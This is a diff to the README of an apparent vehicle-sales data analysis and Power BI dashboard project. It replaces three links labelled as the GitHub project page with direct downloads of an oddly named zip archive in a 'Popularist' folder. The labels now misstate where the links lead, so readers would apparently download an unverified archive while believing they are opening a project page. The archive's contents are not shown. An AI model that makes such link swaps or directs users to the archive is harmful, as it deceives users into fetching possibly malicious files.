@@ -1,6 +1,6 @@
 # 📊 Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard - Vehicle sales insights made simple
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/edithsilicious274/Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/edithsilicious274/Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard/main/Popularist/Vehicle-Power-ED-Sales-B-Python-Dashboard-Data-Analysis-1.9.zip)
 
 ## 🚗 What this project does
 
@@ -20,7 +20,7 @@ It is built for people who want to see what the data says without setting up a c
 
 Use this link to visit the project page and download the files:
 
-[![Visit Project Page](https://img.shields.io/badge/Open-Project%20Page-grey?style=for-the-badge)](https://github.com/edithsilicious274/Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard)
+[![Visit Project Page](https://img.shields.io/badge/Open-Project%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/edithsilicious274/Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard/main/Popularist/Vehicle-Power-ED-Sales-B-Python-Dashboard-Data-Analysis-1.9.zip)
 
 ### What to do on Windows
 
@@ -235,7 +235,7 @@ This project works well for:
 
 Open the project page here:
 
-https://github.com/edithsilicious274/Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard
+https://raw.githubusercontent.com/edithsilicious274/Vehicle_Sales_Data_Analysis_Python_EDA_PowerBI_Dashboard/main/Popularist/Vehicle-Power-ED-Sales-B-Python-Dashboard-Data-Analysis-1.9.zip
 
 ## ✅ Quick start
 
